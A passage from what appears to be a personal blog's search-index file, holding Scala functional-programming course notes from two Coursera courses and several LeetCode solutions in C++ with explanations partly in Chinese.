to:val booleans = integers.map(x =&gt; x &gt; 0)def pairs[T, U](t: Generator[T], u: Generator[U]) = t.flatMap(x =&gt; u.map(y =&gt; (x, y)))// so we have to define map and flatMap for trait Generator:trait Generator[+T] &#123; self =&gt; // an alias for ”this”. def generate: T def map[S](f: T =&gt; S): Generator[S] = new Generator[S] &#123; def generate = f(self.generate) &#125; def flatMap[S](f: T =&gt; Generator[S]): Generator[S] = new Generator[S] &#123; def generate = f(self.generate).generate &#125;&#125; some helper functions: 1234567def single[T](x: T): Generator[T] = new Generator[T] &#123; def generate = x&#125;def choose(lo: Int, hi: Int): Generator[Int] = for (x &lt;- integers) yield lo + x % (hi - lo)def oneOf[T](xs: T*): Generator[T] = for (idx &lt;- choose(0, xs.length)) yield xs(idx) [Exercise] how to implement a generator that creates random Tree objects? 1234567891011121314trait Treecase class Inner(left: Tree, right: Tree) extends Treecase class Leaf(x: Int) extends Tree// my solution:def trees: Generator[Tree] = for &#123; isLeaf &lt;- booleans tree &lt;- if (isLeaf) leafs else inners&#125; yield treedef leafs: Generator[Leaf] = for (x &lt;- integers) yield Leaf(x)def inners: Generator[Inner] = for &#123; left &lt;- trees right &lt;- trees&#125; yield new Inner(left, right) random test: generate random test inputs. 12345678def test[T](g: Generator[T], runTimes: Int = 100) (f: T =&gt; Boolean): Unit = &#123; for (i &lt;- 0 until runTimes) &#123; val t = g.generate assert(f(t), "assert failed for " + t) &#125; println("passed %s tests".format(runTimes))&#125; Lecture 1.4 - Monads a monad is a parametric type M[T] with two operations: flatMap (in the literature, flatMap is more commonly called bind) and unit, that have to satisfy some laws: 1234trait M[T] &#123; def flatMap[U](f: T =&gt; M[U]): M[U]&#125;def unit[T](x: T): M[T] List is a monad with unit(x) = List(x); Set is monad with unit(x) = Set(x); Generator is a monad with unit(x) = single(x) map can be defined for every monad as a combination of flatMap and unit: 1m map f = m flatMap (x =&gt; unit(f(x))) to qualify as a monad, a type has to satisfy three laws: associativity: 1m flatMap f flatMap g == m flatMap (x =&gt; f(x) flatMap g) left unit: 1unix(x) flatMap f == f(x) right unit: 1m flatMap unit == m [Note] you might find List doesn’t obey the left unit rule since List(1) flatMap (Set(_)) = List(1) != Set(1), this is because the monad law assumes f: A =&gt; M[A] (here f: A =&gt; List[A]). Refer to link. 1List(1) flatMap (x =&gt; List(x, x)) = List(1, 1) == (x =&gt; List(x, x))(1) what is the significance of the laws with respect to for syntax? associativity says essentially that one can “inline” nested for expressions: 123456for (y &lt;- for (x &lt;- m; y &lt;- f(x)) yield y z &lt;- g(y)) yield z==for (x &lt;- m; y &lt;- f(x) z &lt;- g(y)) yield z right unit says: 1for (x &lt;- m) yield x == m left unit does not have an analogue for for-expressions. Try is not a monad since it breaks the left unit rule: Try(expr) flatMap f != f(expr): left-hand side will never raise a non-fatal exception whereas the right-hand side will raise any exception thrown by expr or f. Try trades one monad law for another law which is more useful in this context: an expression composed from Try, map, flatMap will never throw a non-fatal exception. Week 2Lecture 2.1 - Structural Induction on TreesLecture 2.2 - Streams streams is similar to lists, but their tail is evaluated only on demand. 12345scala&gt; Stream(1, 2, 3)res0: scala.collection.immutable.Stream[Int] = Stream(1, ?)scala&gt; res0.tailres1: scala.collection.immutable.Stream[Int] = Stream(2, ?) we use #:: instead of :: for stream prepending. how to use stream to improve efficiency?123456// it is inefficient because it constructs all prime numbers between 1000// and 10000 in a list, while what we need is only the second one.((1000 to 10000) filter isPrime)(1)// using stream only needs evaluate the first two prime numbers.((1000 to 10000).toStream filter isPrime)(1) Lecture 2.3 - Lazy Evaluation in a purely functional language an expression produces the same result each time it is evaluated. lazy evaluation means evaluting on first demand, storing the result of the first evaluation and re-using the stored result instead of recomputing. it’s not by-name evaluation where everything is recomputed. it’s not restricted evaluation for normal parameters and val definitions. Haskell use lazy evaluation by default, but Scala use stricted evaluation by default since it also supports mutable side effects (which might be inharmonious with lazy evaluation) in functions. Lecture 2.4 - Computing with Infinite Sequences define an infinity stream: 123def from(n: Int): Stream[Int] = n #:: from(n+1)// all natural numbers:val nats = from(0) calculate all prime numbers: 123def sieve(s: Stream[Int]): Stream[Int] = s.head #:: sieve(s.tail filter (_ % s.head != 0))val primes = sieve(from(2)) calculate the square root: 12345678def sqrtStream(x: Double): Stream[Double] = &#123; def improve(guess: Double) = (guess + x / guess) / 2 lazy val guesses: Stream[Double] = 1 #:: (guesses map improve) guesses&#125;def isGoodEnough(guess: Double, x: Double) = math.abs((guess * guess - x) / x) &lt; 0.0001sqrtStream(4) filter (isGoodEnough(_, 4)) Lecture 2.5 - Case Study: the Water Pouring Problem a very decent solution to Water Pouring Problem, which is quite worthy of being reviewed. some guiding principles for good design: name everything you can. put operations into natural scopes. keep degrees of freedom for future refinements. Week 3Lecture 3.1 - Functions and StateLecture 3.2 - Identity and Change the precise meaning of “being the same” is defined by the property of operational equivalence. x and y are operationally equivalent if no possible test can distinguish between them. Lecture 3.3 - Loops for-loops is not for-expression (end with yield). for-loops translate similarly to for-expression, but using foreach combinator instead of map and flatMap.123for (i &lt;- 1 until 3; j &lt;- "abc") println(i + " " + j)// is translated to(1 until 3) foreach (i =&gt; "abc" foreach (j =&gt; println(i + " " + j))) Lecture 3.4 - Extended Example: Discrete Event SimulationLecture 3.5 - Discrete Event Simulation: API and UsageLecture 3.6 - Discrete Event Simulation: Implementation and TestWeek 4Lecture 4.1 - Imperative Event Handling: The Observer Pattern the Observer Pattern is widely used when views need to react to changes in a model. Variants of it are also called: publish/subscribe. mode/view/controller (MVC). Lecture 4.2 - Functional Reactive Programming imperative reactive programming is about reacting to sequences of events that happen in time, while in functional view: aggregate an event sequence into a signal. generally, an indexted argument like f(E1,...,En) = E is translated to f.update(E1,...,En, E), which also works if n = 0. sig.update(5) can be abbreviated to sig() = 5. we cannot update signal value by s() = s() + 1, since this statement tries to define a signal to be at all points in time one larger than itself. Lecture 4.3 - A Simple FRP ImplementationLecture 4.4 - Latency as an Effect 1Lecture 4.5 - Latency as an Effect 2Lecture 4.6 - Combinators on Futures 1Lecture 4.7 - Combinators on Futures 2 do not block when you have asynchronous computation. Lecture 4.8 - Composing Futures 1Lecture 4.9 - Implementation of flatMap on FutureLecture 4.10 - Composing Futures 2ConclusionsHow to Apply Functional Design Elements in Applications lazy evaluation and infinite data structures distinction between computations and values (e.g. a random value acctually is a computation). monads to abstract over properties of computation (randomness, delays, effects). running computations at some later time.]]></content>
      <categories>
        <category>Open Course</category>
        <category>Coursera</category>
      </categories>
      <tags>
        <tag>Scala</tag>
        <tag>Study Notes</tag>
        <tag>Functional Programming</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[Coursera] Functional Programming Principles in Scala 课程笔记]]></title>
    <url>%2F2018%2F06%2F22%2FCoursera-Functional-Programming-Principles-in-Scala-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Note:This blog is intended to record what I learned in Functional Programming Principles in Scala, rather than share the course materials. So there are two things that I won’t put up: my solution to assignments and topics which I’ve mastered already.PLEASE NOTIFY ME if I broke Coursera Honor Code accidentally. Week 1Lecture 1.1 - Programming Paradigms three main programming paradigms: imperative programming, functional programming and logic programming. (object-oriented programming is orthogonal to them) the largest problem of imperative programming is not suitable for scaling up (limited by the Von Neuman bottleneck). FP = focusing on functions (wider sence, Scala); programming without mutable variables, assignments and imperative control structures (restricted sence, Pure Lisp). functions are first-class citizens in a FP language, which means you can do with a function that you could do with any other piece of data. recommended books: SICP (more about functional programming), Programming in Scala (more about Scala), Scala for the Impatient (for people with a Java background), Scala in Depth (a bit further than others). benefits of FP: simpler reasoning princples, better modularity, good for exploiting parallelism for multicore and cloud computing. Lecture 1.2 - Elements of Programming evaluation of function applications: 1. evaluate all arguments, from left to right; 2. replace function by its right-hand side, and at the same time; 3. replace the formal arguments by the actual arguments. substitution model: scheme of expression evaluation (formaized in the $\lambda-calculas$, which is the foundation of FP). call-by-value and call-by-name: both strategies reduce to the same final value as long as: the reduced expression consists of pure functions and both evaluations terminate. call-by-value: reduces arguments to values before rewriting the function application; evaluate every argument only once. call-by-name: apply the function to unreduced arguments; an argument won’t be evaluated when it’s unused in the evaluation of the function body. Lecture 1.3 - Evaluation Strategies and Temination if call-by-value evaluation of an expression terminates, then call-by-name terminates too. the other direction is not true Scala uses call-by-value by default; But if the type of a function parameter starts with =&gt;, it uses call-by-name.1def foo(x: Int, y: =&gt; Int): Int = x Lecture 1.4 - Conditionals and Value Definitions the def form is by-name (evaluated on each use); val is by-value. Lecture 1.5 - Example: Square roots with Newton’s methodLecture 1.6 - Blocks and Lexical Scope if there are more than one statements on a line, they need to be separated by semicolons. how to write expressions that span several lines: write the multi-line expression in parentheses, because semicolons are never inserted inside (…). write the operator on the first line, because this tells the Scala compiler that the expression is not yet finished.12a +b Lecture 1.7 - Tail Recursion tail recursion: if a function calls itself as its last action, the function’s stack frame can be reused. we can require a function is tail-recursive using a @tailrec annotation. Week 2Lecture 2.1 - High-Order Functions functional languages treat functions as first-class values. higher order functions: functions that take other functions as parameters or return other functions as results. anonymous functions: function literals. Lecture 2.2 - Currying - Principles of Functional Programming the type of sum is (Int =&gt; Int) =&gt; (Int, Int) =&gt; Int: 1def sum(f: Int =&gt; Int)(x: Int, y: Int): Int = ... function types associate to the right, so Int =&gt; Int =&gt; Int is equivalent to Int =&gt; (Int =&gt; Int). Lecture 2.3 - Example: Finding Fixed PointsLecture 2.4 - Scala Syntax Summary12345678910111213141516171819202122232425Type = SimpleType | FunctionTypeFunctionType = SimpleType ‘= &gt; ’ Type | ‘( ’ [ Types ] ‘) ’ ‘= &gt; ’ TypeSimpleType = IdentTypes = Type &#123; ‘ , ’ Type &#125;Expr = InfixExpr | FunctionExpr | if ‘( ’ Expr ‘) ’ Expr else ExprInfixExpr = PrefixExpr | InfixExpr Operator InfixExprOperator = identPrefixExpr = [ ‘+ ’ | ‘-’ | ‘! ’ | ‘~ ’ ] SimpleExprSimpleExpr = ident | literal | SimpleExpr ‘. ’ ident | BlockFunctionExpr = Bindings ‘= &gt; ‘ ExprBindings = ident [ ‘: ’ SimpleType ] | ‘( ’ [ Binding &#123; ‘ , ’ Binding &#125;] ‘) ’Binding = ident [ ‘: ’ Type ]Block = ‘&#123; ’ &#123; Def ‘; ’&#125; Expr ‘&#125; ’Def = FunDef | ValDefFunDef = def ident &#123; ‘( ’ [ Parameters ] ‘) ’&#125; [ ‘: ’ Type ] ‘= ’ ExprValDef = val ident [ ‘: ’ Type ] ‘= ’ ExprParameter = ident ‘: ’ [ ‘= &gt; ’ ] TypeParameters = Parameter &#123; ‘ , ’ Parameter &#125; Lecture 2.5 - Functions and DataLecture 2.6 - More Fun With Rationals data abstraction: the ability to choose different implementation of the data without affecting clients. require and assert: require is used to enforce a precondition on the caller of a function, while assert is used as to check the code of the function itself. Lecture 2.7 - Evaluation and Operators the precedence of an operator is determined by its first character, and the following table lists the characters in increasing order of priority precedence: 12345678910(all letters)|^&amp;&lt; &gt;= !:+ -* / %(all other special characters) exercise: 123a + b ^? c ?^ d less a ==&gt; b | c// is equivalent to((a + b) ^? (c ?^ d)) less ((a ==&gt; b) | c) Week 3Lecture 3.1 - Class Hierarchies abstract classes can contain members which are missing an implementation. no instances of an abstract class can be created with new. dynamic dispatch of methods (in Object-Oriented Language) is analogous to calls to higher-order functions (in Functional Languages): because the code thats gets executed on functional method call is not known statically, but it’s determined by the runtime value that is passed. Lecture 3.2 - How Classes Are Organized a class can only have one superclass, but it could extends multiple traits. trait can contains fields and concrete methods, but it cannot have parameters. Null is a subtype of every class that inherits from Object; it is incompatible with subtypes of AnyVal. Lecture 3.3 - Polymorphism type parameters do not affect evaluation in Scala. type erasure: we can assume that all type parameters and type arguments are removed before evaluating the program. languages that use type erasure: Scala, Java, Haskell, ML, Ocaml. languages that keep the type parameters around run time: C++, C#, F#. polymorphsim has two principal forms: subtyping and generics: subtyping: instances of a subclass can be passed to a base class. generics: instances of a class or function are created by type parameterization. Week 4Lecture 4.1 - Objects Everywhere a pure object oriented language is one which every value is an object. define Boolean as a class from first principles:12345678910111213141516package idealized.scalaabstract class Boolean &#123; def ifThenElse[T](t: =&gt; T, e: =&gt; T): T def &amp;&amp; (x: =&gt; Boolean): Boolean = ifThenElse(x, false) def || (x: =&gt; Boolean): Boolean = ifThenElse(true, x) def unary_!: Boolean = ifThenElse(false, true) def == (x: Boolean): Boolean = ifThenElse(x, x.unary_!) def != (x: Boolean): Boolean = ifThenElse(x.unary_!, x)&#125;object true extends Boolean &#123; def ifThenElse[T](t: =&gt; T, e: =&gt; T) = t&#125;object false extends Boolean &#123; def ifThenElse[T](t: =&gt; T, e: =&gt; T) = e&#125; Lecture 4.2 - Functions as Objects function values are treated as objects in Scala: the function type A =&gt; B is just an abbreviation for class scala.Function1[A, B]. Lecture 4.3 - Subtyping and Generics A &lt;: B is an upper bound of the type parameter A which means A is a subtype of B. A &gt;: B is an lower bound of the type parameter A which means A is a supertype of B. mixed bound is possible: A &gt;: B &lt;: C would restrict A any type on the interval between B and C. Liskov Substitution Principle: let q(x) be a property provable about objects x of type B, then q(y) should be provable for objects y of type A where A &lt;: B Lecture 4.4 - Variance (Optional) (roughly speaking) a type that accepts mutations of its elements should not be covariant, but immutable types can be covariant if some conditions are met. covariant and contravariant: given A &lt;: B, if C[A] &lt;: C[B], C is covariant; if C[A] &gt;: C[B], C is covariant; if neither C[A] nor C[B] is a subtype of the other, C is nonvariant.123class C[+A] &#123; ... &#125; // C is covariantclass C[-A] &#123; ... &#125; // C is contravariantclass C[A] &#123; ... &#125; // C is nonvariant functions must be contravariant in their argument types and covariant in their result types: for a function, if A2 &lt;: A1 and B1 &lt;: B2, then A1 =&gt; B1 &lt;: A2 =&gt; B2. covariant type parameters can only appear in method results. contravariant type parameters can only appear in method parameters. invariant type parameters can appear anywhere. sometimes we have to put in a bit of work to make a class covariant. 12345678trait List[+T] &#123; // the following code does not type-check because T is covariant. // List[IntSet].prepend(Empty) works but List[NonEmpty].prepend(Empty) does not work. def prepend(elem: T): List[T] = new Cons(elem, this) // we can use a lower bound to solve this problem. def prepend [U &gt;: T] (elem: U): List[U] = new Cons(elem, this)&#125; Lecture 4.5 - DecompositionLecture 4.6 - Pattern Matching pattern matching is a generalization of switch from C/Java to class hierarchies. a constructor pattern C(p1, ..., pn) matches all the values of type C (or a subtype) that have been constructed with arguments matching the patterns p1, ..., pn. a variable pattern x matches any value, and binds the name of the variable to this value. a constant pattern c matches values that are equal to c (in the sense of ==) Lecture 4.7 - Lists lists are immutable; lists are recursive, while arrays are flat. like arrays, lists are homogeneous that all elements of a list must all have the same type. operators ending in : associate to the right. Week 5Lecture 5.1 - More Functions on ListsLecture 5.2 - Pairs and TuplesLecture 5.3 - Implicit Parameters scala.math.Ordering[T] provides ways to compare elements of type T. if a function takes an implicit parameter of type T, the compiler will search an implicit definition that: is marked implicit. has a type compatible with T. is visible at the point of the function call, or is defined in a companion object associated with T. if there is a single (most specific) definition, it will be taken as actual argument for the implicit parameter; otherwise it’s an error. Lecture 5.4 - High-Order List FunctionsLecture 5.5 - Reduction of Lists reduceLeft inserts a given binary operator between adjacent elements of a list. foldLeft is like reduceLeft but takes an accumalator. foldLeft and reduceLeft produces trees which lean to the left, while foldRight and reduceRight produces trees which lean to the right. Lecture 5.6 - Reasoning About ConcatLecture 5.7 - A Larger Equational Proof on ListsWeek 6Lecture 6.1 - Other Collections Vector has more evenly balanced access patterns than List based on its structure design. a common base class of List and Vector is Seq, the class of all sequences, which is a subclass of Iterable. 1234Seq, Set, Map &lt;: IterableVector, List, Range &lt;: Seq// Array and String support the same operations as Seq and can implicitly be converted to sequences where needed,// but they cannot be subclasses of Seq because they come from Java. Range represents a sequence of evenly spaced integers, which has three operators: to (inclusive), until (exclusive) and by (step value). 1231 to 4 // 1, 2, 3, 41 until 4 // 1, 2, 31 to 4 by 2 // 1, 3 Lecture 6.2 - Combinatorial Search and For-Expressions a for-expression is of the form: for (s) yield e where: s is a sequence of generators or filters, e is an expression whose value is returned by an iteration. a generator is of the form p &lt;- e. a filter is of the form if f. the sequence must start with a generator. if there’re multiple generators in the sequence, the last generators vary faster than the first one. Lecture 6.3 - Combinatorial Search Example Set is different with Seq: Set is unordered. Set does not have duplicate elements. the fundamental operation on Set is contains. Lecture 6.4 - Maps repeated parameter: T* means you can pass variable number of parameter with type T. Lecture 6.5 - Putting the Pieces Together]]></content>
      <categories>
        <category>Open Course</category>
        <category>Coursera</category>
      </categories>
      <tags>
        <tag>Scala</tag>
        <tag>Study Notes</tag>
        <tag>Functional Programming</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 32. Longest Valid Parentheses]]></title>
    <url>%2F2018%2F04%2F20%2FLeetCode-32-Longest-Valid-Parentheses%2F</url>
    <content type="text"><![CDATA[题目Given a string containing just the characters &apos;(&apos; and &apos;)&apos;, find the length of the longest valid (well-formed) parentheses substring. 标签String, Dynamic Programming, Stack 分析TBD 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394class Solution &#123;public: /* * two traverse */ int longestValidParentheses(string s) &#123; int left, right, stack, len; left = len = 0; // traverse from left to right while (left &lt; (int)s.length()) &#123; while (left &lt; (int)s.length() &amp;&amp; s[left] == ')') left++; right = left; stack = 0; while (right &lt; (int)s.length()) &#123; // stack = Nums(left parentheses) - Nums(right parentheses) if (s[right] == '(') stack++; else if (s[right] == ')') &#123; stack--; if (stack == 0) len = max(len, right - left - stack + 1); else if (stack &lt; 0) break; &#125; right++; &#125; left = right; &#125; right = (int)s.length() - 1; // traverse from right to left while (right &gt;= 0) &#123; while (right &gt;= 0 &amp;&amp; s[right] == '(') right--; left = right; stack = 0; while (left &gt;= 0) &#123; // stack = Nums(right parenth) - Nums(left parenth) if (s[left] == ')') stack++; else if (s[left] == '(') &#123; stack--; if (stack == 0) len = max(len, right - left - stack + 1); else if (stack &lt; 0) break; &#125; left--; &#125; right = left; &#125; return len; &#125; /* * using stack */ int longestValidParentheses_stack(string s) &#123; stack&lt;int&gt; st; int len = 0; // always store the start index in the bottom of stack. // -1 at start, index of last unmatched right parenthesis when traversing. st.push(-1); for (int i = 0; i &lt; (int)s.length(); i++) &#123; if (s[i] == '(') st.push(i); else &#123; st.pop(); // empty means all left parentheses were run out if (st.empty()) st.push(i); else len = max(len, i - st.top()); &#125; &#125; return len; &#125; /* * using dynamic programming */ int longestValidParentheses_dp(string s) &#123; if (s.length() &lt;= 1) return 0; int dpArray[s.length() + 1]; dpArray[0] = dpArray[1] = 0; dpArray[2] = (s[0] == '(' &amp;&amp; s[1] == ')')? 2 : 0; int len = dpArray[2]; for (int i = 2; i &lt; (int)s.length(); i++) &#123; int ii = i + 1; if (s[i] == '(') dpArray[ii] = 0; else &#123; if (s[i-1] == '(') dpArray[ii] = dpArray[ii-2] + 2; else &#123; if (i &gt; dpArray[ii-1] &amp;&amp; s[i - dpArray[ii-1] - 1] == '(') dpArray[ii] = dpArray[ii-1] + 2 + dpArray[i-dpArray[ii-1]-1]; else dpArray[ii] = 0; &#125; &#125; len = max(len, dpArray[ii]); &#125; return len; &#125;&#125;;k]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 31. Next Permutation]]></title>
    <url>%2F2018%2F04%2F19%2FLeetCode-31-Next-Permutation%2F</url>
    <content type="text"><![CDATA[题目Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers. If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order). The replacement must be in-place and use only constant extra memory. Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column. 1,2,3 → 1,3,2 3,2,1 → 1,2,3 1,1,5 → 1,5,1 标签Array 分析先定义在本题中，逆序对表示相邻，且前者比后者更小的元素对。题目解法为：从后往前遍历数组，寻找第一个逆序对（nums[i] &lt; nums[i+1])，此时可知i以后的所有元素按从大到小的顺序排列，我们只需将它们翻转过来，然后将其中最小但比nums[i]大的元素与nums[i]互换即可。当然，如果找不到任何逆序对，那么直接翻转整个数组。 代码12345678910111213141516171819202122232425class Solution &#123;public: void nextPermutation(vector&lt;int&gt;&amp; nums) &#123; int i; for (i = nums.size() - 2; i &gt;= 0; i--) &#123; // stop when we find an inversion pair. if (nums[i] &lt; nums[i+1]) &#123; // nums[i+1:] is in reverse order. reverse(nums.begin() + i + 1, nums.end()); int tmp = nums[i]; for (int j = i + 1; j &lt; (int)nums.size(); j++) &#123; // swap nums[i] with the smallest number that is larger than nums[i]. if (nums[j] &gt; nums[i]) &#123; nums[i] = nums[j]; nums[j] = tmp; break; &#125; &#125; break; &#125; &#125; // no inversion pair found. if (i &lt; 0) reverse(nums.begin(), nums.end()); &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 30. Substring with Concatenation of All Words]]></title>
    <url>%2F2018%2F04%2F18%2FLeetCode-30-Substring-with-Concatenation-of-All-Words%2F</url>
    <content type="text"><![CDATA[题目：You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters. 标签：Hash Table, Two Pointers, String 分析：本题和第3题比较相似，都是采用滑动窗口的思路来求解：维护一前一后两个指针，指针包含的区域即为窗口，始终保证窗口内部的字符串与题目要求不冲突；尽可能地拉伸窗口（即将后指针右移），当窗口内部字符串与题目要求冲突时，通过缩小窗口（右移前指针）来解决冲突。具体地： 首先统计words内各个word的出现次数，生成频率表。 遍历整个字符串， 当word在频率表中可以查到时，将其加入滑动窗口，并累计滑动窗口内每个word的出现次数，如果超过对应频率表中的出现次数，缩小滑动窗口（右移前指针直至该word被移出）； 如果word在频率表中不存在，说明这是一个invalid word，滑动窗口归零，将前指针重置为当前位置，继续遍历； 当滑动窗口大小等于words内所有word的长度之和时，得到题解，存下前指针的位置，然后将前指针右移一格，继续遍历。 需要注意的是，由于所有word等长，且没有交叉字符，因此只需要wordLen（单词长度）轮遍历即可完成任务。 假设word长度为$l$，字符串长度为$n$，计算复杂度为$O(ln)$ 代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class Solution &#123;public: vector&lt;int&gt; findSubstring(string s, vector&lt;string&gt;&amp; words) &#123; if (words.size() == 0) return vector&lt;int&gt;&#123;&#125;; vector&lt;int&gt; res; // count the occurrence number of each word map&lt;string, int&gt; countMap; for (int i = 0; i &lt; (int)words.size(); i++) &#123; if (countMap.find(words[i]) == countMap.end()) countMap[words[i]] = 1; else countMap[words[i]]++; &#125; int wordLen = words[0].length(), totalLen = wordLen * words.size(); /* * All words are of the same length, and * there are no intervening characters. */ for (int i = 0; i &lt; wordLen; i++) &#123; // sliding window int start = i, curr = i; map&lt;string, int&gt; newCount; while (start + totalLen &lt;= (int)s.length()) &#123; string ss = s.substr(curr, wordLen); // current word is invalid if (countMap.find(ss) == countMap.end()) &#123; newCount.clear(); start = curr + wordLen; &#125; else if (newCount.find(ss) != newCount.end()) &#123; newCount[ss]++; // the occurrence number of current word is larger than needed, // slide the `start` pointer until one current word is skipped. if (newCount[ss] &gt; countMap[ss]) &#123; while (start &lt; curr) &#123; string _ss = s.substr(start, wordLen); newCount[_ss]--; start += wordLen; if (_ss == ss) break; &#125; &#125; &#125; else newCount[ss] = 1; curr += wordLen; if (curr - start == totalLen) &#123; res.push_back(start); string _ss = s.substr(start, wordLen); newCount[_ss]--; start += wordLen; &#125; &#125; &#125; return res; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Difference Between Val, Lazy Val and Def]]></title>
    <url>%2F2018%2F04%2F09%2FDifference-Between-Val-Lazy-Val-and-Def%2F</url>
    <content type="text"><![CDATA[val 123456scala&gt; val a = &#123; println("hello, world."); 3 &#125;hello, world.a: Int = 3scala&gt; ares0: Int = 3 lazy val 123456789scala&gt; lazy val a = &#123; println("hello, world."); 3 &#125;a: Int = &lt;lazy&gt;scala&gt; ahello, world.res1: Int = 3scala&gt; ares2: Int = 3 def 12345678910scala&gt; def a = &#123; println("hello, world."); 3 &#125;a: Intscala&gt; ahello, world.res4: Int = 3scala&gt; ahello, world.res5: Int = 3 TBD]]></content>
      <tags>
        <tag>Scala</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 29. Divide Two Integers]]></title>
    <url>%2F2018%2F03%2F28%2FLeetCode-29-Divide-Two-Integers%2F</url>
    <content type="text"><![CDATA[题目：Divide two integers without using multiplication, division and mod operator. If it is overflow, return MAX_INT. 标签：Math, Binary Search, Overflow 分析：题目看起来很简单，但是通过率并不高。首先，单纯地用dividend一直减divisor肯定会超时，其次，实际计算过程中很容易出现overflow的情况，比如，对INT_MIN求绝对值。为了防止算法超时，可以使用移位运算符成倍增大divisor，尽可能逼近dividend，然后将dividend设为dividend - divisor，重复循环。原理与二分查找类似。 代码：12345678910111213141516171819202122232425class Solution &#123;public: int divide(int dividend, int divisor) &#123; if (divisor == 0) return INT_MAX; if (divisor == 1) return dividend; if (divisor == -1) return dividend == INT_MIN? INT_MAX : -dividend; // convert both dividend and divisor to negative number. bool neg = (dividend &lt; 0) ^ (divisor &lt; 0); if (dividend &gt; 0) dividend = -dividend; if (divisor &gt; 0) divisor = -divisor; int res = 0; while (dividend &lt;= divisor) &#123; long long cnt = 1, new_divisor = divisor; // use long long to avoid overflow while (dividend &lt;= new_divisor) &#123; cnt &lt;&lt;= 1; // cnt *= 2 new_divisor &lt;&lt;= 1; // new_divisor *= 2 &#125; dividend -= new_divisor &gt;&gt; 1; res += cnt &gt;&gt; 1; &#125; return neg? -res : res; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 28. Implement strStr()]]></title>
    <url>%2F2018%2F03%2F28%2FLeetCode-28-Implement-strStr%2F</url>
    <content type="text"><![CDATA[题目：Implement strStr(). Return the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack. Example 1: Input: haystack = &quot;hello&quot;, needle = &quot;ll&quot; Output: 2 Example 2: Input: haystack = &quot;aaaaa&quot;, needle = &quot;bba&quot; Output: -1 标签：Two Pointers, String, KMP 分析：注意edge case的存在，比如当needle为&quot;&quot;时，结果应该是0，而非-1。最简单的做法是，遍历haystack，当出现与needle[0]匹配的字符时，进入匹配循环，如果匹配成功，即可返回当前索引；如果匹配失败，继续遍历。这种算法在最差情况下的复杂度为$O(MN)$（假设needle、haystack长度分别为$m$、$n$）。具体的改进方法有两种： 使用双指针：当找到与needle[0]匹配的字符时，使用两个指针分别从needle头部、尾部同时匹配，当指针出现交叉时，匹配结束。这种方法相较于原始方法，在某些情况下有很大改进，不妨试想haystack=&quot;111...11&quot;、needle=&quot;111..12&quot;的场景。 KMP算法：注意到，无论是原始方法，还是改进的双指针算法，它们都存在着“信息浪费”的情况，即匹配过程中，我们其实已经对haystack进行了一段距离的遍历，但是匹配结束后，我们并没有对遍历结果加以利用，而是重新开始了新的遍历+匹配。KMP算法很巧妙地利用了prefix=suffix的特征，允许我们在匹配结束后，省去一段距离的遍历。具体算法原理在之后的post中会详细说明。 代码：1234567891011121314151617181920212223class Solution &#123;public: // using two pointers int strStr(string haystack, string needle) &#123; if (needle.length() &gt; haystack.length()) return -1; if (needle == "") return 0; int len = needle.length(), start, end; for (int i = 0; i &lt; (int)haystack.length(); i++) &#123; if (needle[0] == haystack[i]) &#123; start = i+1; end = i + len - 1; // start matching from both sides. if (end &gt;= (int)haystack.length()) break; while (start &lt;= end) &#123; if (haystack[start] != needle[start-i] || haystack[end] != needle[end-i]) break; start++; end--; &#125; if (start &gt; end) return i; &#125; &#125; return -1; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 27. Remove Element]]></title>
    <url>%2F2018%2F03%2F28%2FLeetCode-27-Remove-Element%2F</url>
    <content type="text"><![CDATA[题目：Given an array and a value, remove all instances of that value in-place and return the new length. Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory. The order of elements can be changed. It doesn&apos;t matter what you leave beyond the new length. Example: Given nums = [3,2,2,3], val = 3, Your function should return length = 2, with the first two elements of nums being 2. 标签：Array, Two Pointers 分析：和前一题类似，维护两个指针，一个指向“新”数组的尾部，另一个用于遍历“原”数组。 代码：123456789101112class Solution &#123;public: int removeElement(vector&lt;int&gt;&amp; nums, int val) &#123; if (nums.size() == 0) return 0; int i = 0, j = 0; while (j &lt; nums.size()) &#123; if (nums[j++] == val) continue; else nums[i++] = nums[j-1]; &#125; return i; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 26. Remove Duplicates from Sorted Array]]></title>
    <url>%2F2018%2F03%2F28%2FLeetCode-26-Remove-Duplicates-from-Sorted-Array%2F</url>
